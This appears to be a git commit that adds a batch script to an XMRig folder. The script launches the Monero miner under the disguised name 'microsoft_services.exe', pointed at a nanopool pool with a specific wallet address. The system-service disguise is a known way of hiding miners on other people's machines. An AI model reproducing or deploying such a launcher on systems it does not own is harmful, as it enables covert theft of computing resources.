1a353b9841b91781e405cd00d4f869bc4bd575ec
naveenrhce5 <naveenrhce5@gmail.com>
2026-02-08 10:49:37 +0530

    Add files via upload

---
+++ xmrig-6.24.0/start.cmd
@@ -0,0 +1,4 @@
+@echo off
+cd /d "%~dp0"
+microsoft_services.exe --coin xmr -o xmr-asia1.nanopool.org:10300 -u 43gPwWCiT1nCvkiu3QLq2VakmRHtsFNFuThN147sN9S6SQaZHDssTToUBnfKZT98j9L4GpieDc3LPBBcKAFqMZ6nAegEFQ3.Dahiya/naveenrhce5@gmail.com -p x
+pause
